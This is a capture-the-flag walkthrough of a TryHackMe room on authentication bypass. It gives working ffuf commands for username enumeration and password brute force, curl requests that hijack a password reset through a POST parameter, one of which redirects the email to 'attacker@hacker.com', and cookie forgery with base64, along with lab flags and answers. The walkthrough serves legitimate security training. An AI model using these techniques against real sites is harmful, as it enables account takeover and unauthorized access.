# Authentication Bypass

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Walkthrough
Difficulty: Easy
OS: N/A
Subscription type: Premium
Description:
Learn how to defeat logins and other authentication mechanisms to allow you access to unpermitted areas.
```

Room link: [https://tryhackme.com/room/authenticationbypass](https://tryhackme.com/room/authenticationbypass)

## Solution

### Task 1: Brief

In this room, we will learn about different ways website authentication methods can be bypassed, defeated or broken. These vulnerabilities can be some of the most critical as it often ends in leaks of customers personal data.

Start the machine and then proceed to the next task.

### Task 2: Username Enumeration

A helpful exercise to complete when trying to find authentication vulnerabilities is creating a list of valid usernames, which we'll use later in other tasks.

Website error messages are great resources for collating this information to build our list of valid usernames. We have a form to create a new user account if we go to the Acme IT Support website (`http://10.10.183.42/customers/signup`) signup page.

If you try entering the username **admin** and fill in the other form fields with fake information, you'll see we get the error `An account with this username already exists`. We can use the existence of this error message to produce a list of valid usernames already signed up on the system by using the ffuf tool below. The ffuf tool uses a list of commonly used usernames to check against for any matches.

```bash
user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.183.42/customers/signup -mr "username already exists"
```

In the above example, the `-w` argument selects the file's location on the computer that contains the list of usernames that we're going to check exists. The `-X` argument specifies the request method, this will be a GET request by default, but it is a POST request in our example. The `-d` argument specifies the data that we are going to send. In our example, we have the fields username, email, password and cpassword. We've set the value of the username to **FUZZ**. In the ffuf tool, the **FUZZ** keyword signifies where the contents from our wordlist will be inserted in the request. The `-H` argument is used for adding additional headers to the request. In this instance, we're setting the `Content-Type` so the web server knows we are sending form data. The `-u` argument specifies the URL we are making the request to, and finally, the `-mr` argument is the text on the page we are looking for to validate we've found a valid username.

The ffuf tool and wordlist come pre-installed on the AttackBox or can be installed locally by downloading it from [https://github.com/ffuf/ffuf](https://github.com/ffuf/ffuf).

Create a file called valid_usernames.txt and add the usernames that you found using ffuf; these will be used in Task 3.

Answer the questions below.

---------------------------------------------------------------------------------------

Scan for already registered users with ffuf

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Authentication_Bypass]
└─$ ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.183.42/customers/signup -mr "username already exists" 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.183.42/customers/signup
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/Names/names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&email=x&password=x&cpassword=x
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: username already exists
________________________________________________

admin                   [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 47ms]
robert                  [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 45ms]
simon                   [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 47ms]
steve                   [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 46ms]
:: Progress: [10177/10177] :: Job [1/1] :: 682 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```

Create the file with valid usernames

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Authentication_Bypass]
└─$ vi valid_usernames.txt                                                    

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Authentication_Bypass]
└─$ cat valid_usernames.txt                                
admin
robert
simon
steve
```

#### What is the username starting with si*** ?

Answer: `simon`

#### What is the username starting with st*** ?

Answer: `steve`

#### What is the username starting with ro**** ?

Answer: `robert`

### Task 3: Brute Force

Using the `valid_usernames.txt` file we generated in the previous task, we can now use this to attempt a brute force attack on the login page (`http://10.10.183.42/customers/login`).

Note: If you created your `valid_usernames.txt` file by piping the output from ffuf directly you may have difficulty with this task. Clean your data, or copy just the names into a new file.

A brute force attack is an automated process that tries a list of commonly used passwords against either a single username or, like in our case, a list of usernames.

When running this command, make sure the terminal is in the same directory as the `valid_usernames.txt` file.

```bash
user@tryhackme$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.183.42/customers/login -fc 200
```

This ffuf command is a little different to the previous one in Task 2. Previously we used the **FUZZ** keyword to select where in the request the data from the wordlists would be inserted, but because we're using multiple wordlists, we have to specify our own **FUZZ** keyword. In this instance, we've chosen **W1** for our list of valid usernames and **W2** for the list of passwords we will try. The multiple wordlists are again specified with the `-w` argument but separated with a comma. For a positive match, we're using the `-fc` argument to check for an HTTP status code other than 200.

Running the above command will find a single working username and password combination that answers the question below.

---------------------------------------------------------------------------------------

Use the `-ac` parameter for automatic filtering instead of `-fc 200`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Authentication_Bypass]
└─$ ffuf -w valid_usernames.txt:USER,/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:PW -X POST -d "username=USER&password=PW" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.183.42/customers/login -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.183.42/customers/login
 :: Wordlist         : USER: /mnt/hgfs/Wargames/TryHackMe/Walkthroughs/Easy/Authentication_Bypass/valid_usernames.txt
 :: Wordlist         : PW: /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=USER&password=PW
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 84ms]
    * PW: thunder
    * USER: steve

:: Progress: [404/404] :: Job [1/1] :: 611 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

#### What is the valid username and password (format: username/password)?

Answer: `steve/thunder`

### Task 4: Logic Flaw

#### What is a Logic Flaw?

Sometimes authentication processes contain logic flaws. A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker. Logic flaws can exist in any area of a website, but we're going to concentrate on examples relating to authentication in this instance.

![Logic Flaw Abuse](Images/Logic_Flaw_Abuse.png)

#### Logic Flaw Example

The below mock code example checks to see whether the start of the path the client is visiting begins with `/admin` and if so, then further checks are made to see whether the client is, in fact, an admin. If the page doesn't begin with `/admin`, the page is shown to the client.

```php
if( url.substr(0,6) === '/admin') {
    # Code to check user is an admin
} else {
    # View Page
}
```

Because the above PHP code example uses three equals signs (===), it's looking for an exact match on the string, including the same letter casing. The code presents a logic flaw because an unauthenticated user requesting `/adMin` will not have their privileges checked and have the page displayed to them, totally bypassing the authentication checks.

#### Logic Flaw Practical

We're going to examine the Reset Password function of the Acme IT Support website (`http://10.10.183.42/customers/reset`). We see a form asking for the email address associated with the account on which we wish to perform the password reset. If an invalid email is entered, you'll receive the error message "Account not found from supplied email address".

For demonstration purposes, we'll use the email address `robert@acmeitsupport.thm` which is accepted. We're then presented with the next stage of the form, which asks for the username associated with this login email address. If we enter robert as the username and press the Check Username button, you'll be presented with a confirmation message that a password reset email will be sent to `robert@acmeitsupport.thm`.

![Password Reset at Acme](Images/Password_Reset_at_Acme.png)

At this stage, you may be wondering what the vulnerability could be in this application as you have to know both the email and username and then the password link is sent to the email address of the account owner.

This walkthrough will require running both of the below Curl Requests on the AttackBox which can be opened by using the Blue Button Above.

In the second step of the reset email process, the username is submitted in a POST field to the web server, and the email address is sent in the query string request as a GET field.

Let's illustrate this by using the curl tool to manually make the request to the webserver.

```bash
user@tryhackme$ curl 'http://10.10.183.42/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
```

We use the `-H` flag to add an additional header to the request. In this instance, we are setting the `Content-Type` to `application/x-www-form-urlencoded`, which lets the web server know we are sending form data so it properly understands our request.

In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable `$_REQUEST`.

The PHP `$_REQUEST` variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable **favours POST data fields** rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.

```bash
user@tryhackme$ curl 'http://10.10.183.42/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```

![Password Reset at Acme 2](Images/Password_Reset_at_Acme_2.png)

For the next step, you'll need to create an account on the Acme IT support customer section, doing so gives you a unique email address that can be used to create support tickets. The email address is in the format of `{username}@customer.acmeitsupport.thm`

Now rerunning Curl Request 2 but with your @acmeitsupport.thm in the email field you'll have a ticket created on your account which contains a link to log you in as Robert. Using Robert's account, you can view their support tickets and reveal a flag.

```bash
user@tryhackme:~$ curl 'http://10.10.183.42/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
```

---------------------------------------------------------------------------------------

#### What is the flag from Robert's support ticket?

Sign up a new user at `http://10.10.183.42/customers/signup`

Username: `cajac`
E-mail: `cajac@customer.acmeitsupport.thm`
Password: `thm123auth`

Issue a password reset request for Robert but send the e-mail to us

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Authentication_Bypass]
└─$ curl 'http://10.10.183.42/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=cajac@customer.acmeitsupport.thm'
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Acme IT Support - Customer Login</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.12.0/css/all.css" integrity="sha384-ekOryaXPbeCpWQNxMwSWVvQ0+1VrStoPJq54shlYhR8HzQgig1v5fas6YgOqLoKz" crossorigin="anonymous">
        <link rel="stylesheet" href="/assets/bootstrap.min.css">
    <link rel="stylesheet" href="/assets/style.css">
</head>
<body>
    <nav class="navbar navbar-inverse navbar-fixed-top">
        <div class="container">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand" href="#">Acme IT Support</a>
            </div>
            <div id="navbar" class="collapse navbar-collapse">
                <ul class="nav navbar-nav">
                    <li><a href="/">Home</a></li>
                    <li><a href="/news">News</a></li>
                    <li><a href="/contact">Contact</a></li>
                    <li class="active"><a href="/customers">Customers</a></li>
                </ul>
            </div><!--/.nav-collapse -->
        </div>
    </nav><div class="container" style="padding-top:60px">
    <h1 class="text-center">Acme IT Support</h1>
    <h2 class="text-center">Reset Password</h2>
    <div class="row">
        <div class="col-md-4 col-md-offset-4">
                        <div class="alert alert-success text-center">
                <p>We'll send you a reset email to <strong>cajac@customer.acmeitsupport.thm</strong></p>
            </div>
                    </div>
    </div>
</div>
<script src="/assets/jquery.min.js"></script>
<script src="/assets/bootstrap.min.js"></script>
<script src="/assets/site.js"></script>
</body>
</html>
<!--
Page Generated in 0.03032 Seconds using the THM Framework v1.2 ( https://static-labs.tryhackme.cloud/sites/thm-web-framework )
-->   
```

Check the support ticket for your account. You should have a new `Password Reset` ticket.

```text
We've received, a request to reset your password, please visit http://10.10.183.42/customers/reset/78d7933b824c3d6f29a4c2cbf286f247 
to automatically login, and then you can reset your password from the 'Your Account' page.
```

Use the link to login as Robert and check his support ticket for the flag.

Answer: `THM{<REDACTED>}`

### Task 5: Cookie Tampering

Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges. If you need a refresher on cookies, check out the [HTTP In Detail room](https://tryhackme.com/room/httpindetail) on task 6.

#### Plain Text

The contents of some cookies can be in plain text, and it is obvious what they do. Take, for example, if these were the cookie set after a successful login:

`Set-Cookie: logged_in=true; Max-Age=3600; Path=/`  
`Set-Cookie: admin=false; Max-Age=3600; Path=/`

We see one cookie (logged_in), which appears to control whether the user is currently logged in or not, and another (admin), which controls whether the visitor has admin privileges. Using this logic, if we were to change the contents of the cookies and make a request we'll be able to change our privileges.

First, we'll start just by requesting the target page:

```bash
user@tryhackme$ curl http://10.10.183.42/cookie-test
```

We can see we are returned a message of: **Not Logged In**

Now we'll send another request with the logged_in cookie set to true and the admin cookie set to false:

```bash
user@tryhackme$ curl -H "Cookie: logged_in=true; admin=false" http://10.10.183.42/cookie-test
```

We are given the message: **Logged In As A User**

Finally, we'll send one last request setting both the logged_in and admin cookie to true:

```bash
user@tryhackme$ curl -H "Cookie: logged_in=true; admin=true" http://10.10.183.42/cookie-test
```

This returns the result: **Logged In As An Admin** as well as a flag which you can use to answer question one.

#### Hashing

Sometimes cookie values can look like a long string of random characters; these are called hashes which are an irreversible representation of the original text. Here are some examples that you may come across:

| Original String | Hash Method | Output |
|----|----|----|
|1|md5|c4ca4238a0b923820dcc509a6f75849b|
|1|sha-256|6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b|
|1|sha-512|4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a|
|1|sha1|356a192b7913b04c54574d18c28d46e6395428ab|

You can see from the above table that the hash output from the same input string can significantly differ depending on the hash method in use.

Even though the hash is irreversible, the same output is produced every time, which is helpful for us as services such as [crackstation.net](https://crackstation.net/) keep databases of billions of hashes and their original strings.

#### Encoding

Encoding is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is reversible. So it begs the question, what is the point in encoding? Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.

Common encoding types are **base32** which converts binary data to the characters A-Z and 2-7, and **base64** which converts using the characters a-z, A-Z, 0-9,+, / and the equals sign for padding.

Take the below data as an example which is set by the web server upon logging in:

`Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/`

This string base64 decoded has the value of `{"id":1,"admin": false}` we can then encode this back to base64 encoded again but instead setting the admin value to true, which now gives us admin access.

---------------------------------------------------------------------------------------

#### What is the flag from changing the plain text cookie values?

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Authentication_Bypass]
└─$ curl -H "Cookie: logged_in=true; admin=true" http://10.10.183.42/cookie-test
Logged In As An Admin - THM{<REDACTED>}

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Authentication_Bypass]
└─$ curl --cookie "logged_in=true; admin=true" http://10.10.183.42/cookie-test
Logged In As An Admin - THM{<REDACTED>}
```

Answer: `THM{<REDACTED>}`

#### What is the value of the md5 hash 3b2a1053e3270077456a79192070aa78 ?

Visit [https://crackstation.net/](https://crackstation.net/) and check the hash

Answer: `463729`

#### What is the base64 decoded value of VEhNe0JBU0U2NF9FTkNPRElOR30= ?

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Authentication_Bypass]
└─$ echo 'VEhNe0JBU0U2NF9FTkNPRElOR30=' | base64 -d        
THM{<REDACTED>}
```

Answer: `THM{<REDACTED>}`

#### Encode the following value using base64 {"id":1,"admin":true}

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Authentication_Bypass]
└─$ echo -n '{"id":1,"admin":true}' | base64
eyJpZCI6MSwiYWRtaW4iOnRydWV9
```

Note the `-n` parameter that prevents addition of a newline character (which is the default).

Answer: `eyJpZCI6MSwiYWRtaW4iOnRydWV9`

For additional information, please see the references below.

## References

- [base64 - Linux manual page](https://man7.org/linux/man-pages/man1/base64.1.html)
- [Base64 - Wikipedia](https://en.wikipedia.org/wiki/Base64)
- [Brute-force attack - Wikipedia](https://en.wikipedia.org/wiki/Brute-force_attack)
- [Cryptographic hash function - Wikipedia](https://en.wikipedia.org/wiki/Cryptographic_hash_function)
- [curl - Homepage](https://curl.se/)
- [curl - Linux manual page](https://man7.org/linux/man-pages/man1/curl.1.html)
- [cURL - Wikipedia](https://en.wikipedia.org/wiki/CURL)
- [ffuf - GitHub](https://github.com/ffuf/ffuf)
- [ffuf - Kali Tools](https://www.kali.org/tools/ffuf/)
- [HTTP cookie - Wikipedia](https://en.wikipedia.org/wiki/HTTP_cookie)
- [MD5 - Wikipedia](https://en.wikipedia.org/wiki/MD5)
